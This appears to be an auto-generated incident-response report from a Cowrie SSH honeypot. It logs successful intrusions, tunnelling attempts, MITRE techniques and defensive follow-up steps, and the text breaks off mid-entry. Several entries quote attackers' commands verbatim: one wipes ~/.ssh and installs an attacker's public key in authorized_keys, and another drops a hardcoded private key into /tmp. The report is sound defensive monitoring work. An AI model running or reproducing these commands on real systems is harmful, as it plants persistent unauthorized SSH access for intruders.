| `2026-08-21 08:21:06` | `cowrie.session.connect` |
| `2026-08-21 08:21:06` | `cowrie.client.version` |
| `2026-08-21 08:21:07` | `cowrie.client.kex` |
| `2026-08-21 08:21:09` | `cowrie.login.success` |
| `2026-08-21 08:21:09` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:21:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:21:09` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3feeb5040baf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:21 |
| **Last Seen** | 2026-08-21 08:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:21:12` | `cowrie.session.connect` |
| `2026-08-21 08:21:12` | `cowrie.client.version` |
| `2026-08-21 08:21:12` | `cowrie.client.kex` |
| `2026-08-21 08:21:13` | `cowrie.login.success` |
| `2026-08-21 08:21:13` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:21:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:21:14` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:21:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac788fa0b106

| Field | Detail |
|---|---|
| **Source IP** | `187.93.68[.]178` |
| **First Seen** | 2026-08-21 08:21 |
| **Last Seen** | 2026-08-21 08:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:21:20` | `cowrie.session.connect` |
| `2026-08-21 08:21:21` | `cowrie.client.version` |
| `2026-08-21 08:21:21` | `cowrie.client.kex` |
| `2026-08-21 08:21:23` | `cowrie.login.success` |
| `2026-08-21 08:21:23` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.93.68[.]178` to AbuseIPDB if not already reported
- [ ] Block `187.93.68[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db44b4c7363e

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-08-21 08:21 |
| **Last Seen** | 2026-08-21 08:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:21:29` | `cowrie.session.connect` |
| `2026-08-21 08:21:29` | `cowrie.client.version` |
| `2026-08-21 08:21:29` | `cowrie.client.kex` |
| `2026-08-21 08:21:31` | `cowrie.login.success` |
| `2026-08-21 08:21:32` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ddc3979cd7

| Field | Detail |
|---|---|
| **Source IP** | `177.135.209[.]177` |
| **First Seen** | 2026-08-21 08:23 |
| **Last Seen** | 2026-08-21 08:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:23:18` | `cowrie.session.connect` |
| `2026-08-21 08:23:19` | `cowrie.client.version` |
| `2026-08-21 08:23:19` | `cowrie.client.kex` |
| `2026-08-21 08:23:21` | `cowrie.login.success` |
| `2026-08-21 08:23:21` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.209[.]177` to AbuseIPDB if not already reported
- [ ] Block `177.135.209[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f567d0c6aa5

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]250` |
| **First Seen** | 2026-08-21 08:28 |
| **Last Seen** | 2026-08-21 08:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:28:20` | `cowrie.session.connect` |
| `2026-08-21 08:28:20` | `cowrie.client.version` |
| `2026-08-21 08:28:20` | `cowrie.client.kex` |
| `2026-08-21 08:28:23` | `cowrie.login.success` |
| `2026-08-21 08:28:23` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]250` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa12f04ba6f4

| Field | Detail |
|---|---|
| **Source IP** | `42.3.98[.]247` |
| **First Seen** | 2026-08-21 08:31 |
| **Last Seen** | 2026-08-21 08:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:31:17` | `cowrie.session.connect` |
| `2026-08-21 08:31:18` | `cowrie.client.version` |
| `2026-08-21 08:31:18` | `cowrie.client.kex` |
| `2026-08-21 08:31:19` | `cowrie.login.success` |
| `2026-08-21 08:31:20` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.3.98[.]247` to AbuseIPDB if not already reported
- [ ] Block `42.3.98[.]247` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-852730fd33ce

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-08-21 08:31 |
| **Last Seen** | 2026-08-21 08:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:31:30` | `cowrie.session.connect` |
| `2026-08-21 08:31:30` | `cowrie.client.version` |
| `2026-08-21 08:31:30` | `cowrie.client.kex` |
| `2026-08-21 08:31:31` | `cowrie.login.success` |
| `2026-08-21 08:31:32` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c159da585d9c

| Field | Detail |
|---|---|
| **Source IP** | `112.118.194[.]159` |
| **First Seen** | 2026-08-21 08:31 |
| **Last Seen** | 2026-08-21 08:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:31:37` | `cowrie.session.connect` |
| `2026-08-21 08:31:37` | `cowrie.client.version` |
| `2026-08-21 08:31:37` | `cowrie.client.kex` |
| `2026-08-21 08:31:40` | `cowrie.login.success` |
| `2026-08-21 08:31:41` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.118.194[.]159` to AbuseIPDB if not already reported
- [ ] Block `112.118.194[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67ed3fd00b19

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-08-21 08:31 |
| **Last Seen** | 2026-08-21 08:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:31:37` | `cowrie.session.connect` |
| `2026-08-21 08:31:37` | `cowrie.client.version` |
| `2026-08-21 08:31:37` | `cowrie.client.kex` |
| `2026-08-21 08:31:37` | `cowrie.login.success` |
| `2026-08-21 08:31:38` | `cowrie.session.params` |
| `2026-08-21 08:31:38` | `cowrie.command.input` |
| `2026-08-21 08:31:38` | `cowrie.command.failed` |
| `2026-08-21 08:31:38` | `cowrie.log.closed` |
| `2026-08-21 08:31:39` | `cowrie.session.params` |
| `2026-08-21 08:31:39` | `cowrie.command.input` |
| `2026-08-21 08:31:39` | `cowrie.session.file_download` |
| `2026-08-21 08:31:39` | `cowrie.log.closed` |
| `2026-08-21 08:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fe13b04fbe

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-08-21 08:31 |
| **Last Seen** | 2026-08-21 08:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:31:39` | `cowrie.session.connect` |
| `2026-08-21 08:31:39` | `cowrie.client.version` |
| `2026-08-21 08:31:39` | `cowrie.client.kex` |
| `2026-08-21 08:31:39` | `cowrie.login.success` |
| `2026-08-21 08:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae845305b096

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-08-21 08:31 |
| **Last Seen** | 2026-08-21 08:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:31:39` | `cowrie.session.connect` |
| `2026-08-21 08:31:39` | `cowrie.client.version` |
| `2026-08-21 08:31:39` | `cowrie.client.kex` |
| `2026-08-21 08:31:39` | `cowrie.login.success` |
| `2026-08-21 08:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb360e861aee

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:31 |
| **Last Seen** | 2026-08-21 08:32 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:31:59` | `cowrie.session.connect` |
| `2026-08-21 08:32:00` | `cowrie.client.version` |
| `2026-08-21 08:32:00` | `cowrie.client.kex` |
| `2026-08-21 08:32:03` | `cowrie.login.success` |
| `2026-08-21 08:32:16` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27a857eedb02

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:32 |
| **Last Seen** | 2026-08-21 08:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:32:04` | `cowrie.session.connect` |
| `2026-08-21 08:32:05` | `cowrie.client.version` |
| `2026-08-21 08:32:05` | `cowrie.client.kex` |
| `2026-08-21 08:32:08` | `cowrie.login.success` |
| `2026-08-21 08:32:10` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:32:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:32:11` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-175121dd658c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-21 08:35 |
| **Last Seen** | 2026-08-21 08:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:35:01` | `cowrie.session.connect` |
| `2026-08-21 08:35:01` | `cowrie.client.version` |
| `2026-08-21 08:35:01` | `cowrie.client.kex` |
| `2026-08-21 08:35:02` | `cowrie.login.success` |
| `2026-08-21 08:35:02` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:35:02` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-725cdb90c891

| Field | Detail |
|---|---|
| **Source IP** | `65.20.143[.]45` |
| **First Seen** | 2026-08-21 08:38 |
| **Last Seen** | 2026-08-21 08:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:38:48` | `cowrie.session.connect` |
| `2026-08-21 08:38:48` | `cowrie.client.version` |
| `2026-08-21 08:38:48` | `cowrie.client.kex` |
| `2026-08-21 08:38:50` | `cowrie.login.success` |
| `2026-08-21 08:38:50` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.143[.]45` to AbuseIPDB if not already reported
- [ ] Block `65.20.143[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f58deed23c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:43 |
| **Last Seen** | 2026-08-21 08:44 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:43:11` | `cowrie.session.connect` |
| `2026-08-21 08:43:11` | `cowrie.client.version` |
| `2026-08-21 08:43:11` | `cowrie.client.kex` |
| `2026-08-21 08:43:14` | `cowrie.login.success` |
| `2026-08-21 08:43:16` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:44:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:44:07` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a26c89ceee5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 08:43 |
| **Last Seen** | 2026-08-21 08:43 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:43:15` | `cowrie.session.connect` |
| `2026-08-21 08:43:15` | `cowrie.client.version` |
| `2026-08-21 08:43:16` | `cowrie.client.kex` |
| `2026-08-21 08:43:17` | `cowrie.login.success` |
| `2026-08-21 08:43:18` | `cowrie.direct-tcpip.request` |
| `2026-08-21 08:43:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 08:43:31` | `cowrie.direct-tcpip.data` |
| `2026-08-21 08:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-643074998f1c

| Field | Detail |
|---|---|
| **Source IP** | `8.208.44[.]152` |
| **First Seen** | 2026-08-21 08:44 |
| **Last Seen** | 2026-08-21 08:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:44:08` | `cowrie.session.connect` |
| `2026-08-21 08:44:08` | `cowrie.client.version` |
| `2026-08-21 08:44:08` | `cowrie.client.kex` |
| `2026-08-21 08:44:08` | `cowrie.login.success` |
| `2026-08-21 08:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.208.44[.]152` to AbuseIPDB if not already reported
- [ ] Block `8.208.44[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf4d161e4996

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-21 08:44 |
| **Last Seen** | 2026-08-21 08:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:44:09` | `cowrie.session.connect` |
| `2026-08-21 08:44:09` | `cowrie.client.version` |
| `2026-08-21 08:44:09` | `cowrie.client.kex` |
| `2026-08-21 08:44:09` | `cowrie.login.success` |
| `2026-08-21 08:44:11` | `cowrie.session.params` |
| `2026-08-21 08:44:11` | `cowrie.command.input` |
| `2026-08-21 08:44:11` | `cowrie.session.file_download` |
| `2026-08-21 08:44:11` | `cowrie.session.file_download` |
| `2026-08-21 08:44:11` | `cowrie.log.closed` |
| `2026-08-21 08:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff5437c3008e

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-08-21 08:46 |
| **Last Seen** | 2026-08-21 08:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:46:06` | `cowrie.session.connect` |
| `2026-08-21 08:46:06` | `cowrie.client.version` |
| `2026-08-21 08:46:07` | `cowrie.client.kex` |
| `2026-08-21 08:46:08` | `cowrie.login.success` |
| `2026-08-21 08:46:09` | `cowrie.session.params` |
| `2026-08-21 08:46:09` | `cowrie.command.input` |
| `2026-08-21 08:46:09` | `cowrie.command.failed` |
| `2026-08-21 08:46:09` | `cowrie.log.closed` |
| `2026-08-21 08:46:10` | `cowrie.session.params` |
| `2026-08-21 08:46:10` | `cowrie.command.input` |
| `2026-08-21 08:46:10` | `cowrie.session.file_download` |
| `2026-08-21 08:46:10` | `cowrie.log.closed` |
| `2026-08-21 08:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-956127c108b2

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-08-21 08:46 |
| **Last Seen** | 2026-08-21 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:46:11` | `cowrie.session.connect` |
| `2026-08-21 08:46:11` | `cowrie.client.version` |
| `2026-08-21 08:46:11` | `cowrie.client.kex` |
| `2026-08-21 08:46:12` | `cowrie.login.success` |
| `2026-08-21 08:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
- [ ] Block `118.139.164[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7df3e90888b

| Field | Detail |
|---|---|
| **Source IP** | `118.139.164[.]171` |
| **First Seen** | 2026-08-21 08:46 |
| **Last Seen** | 2026-08-21 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 08:46:12` | `cowrie.session.connect` |
| `2026-08-21 08:46:12` | `cowrie.client.version` |
| `2026-08-21 08:46:12` | `cowrie.client.kex` |
| `2026-08-21 08:46:13` | `cowrie.login.success` |
| `2026-08-21 08:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.139.164[.]171` to AbuseIPDB if not already reported
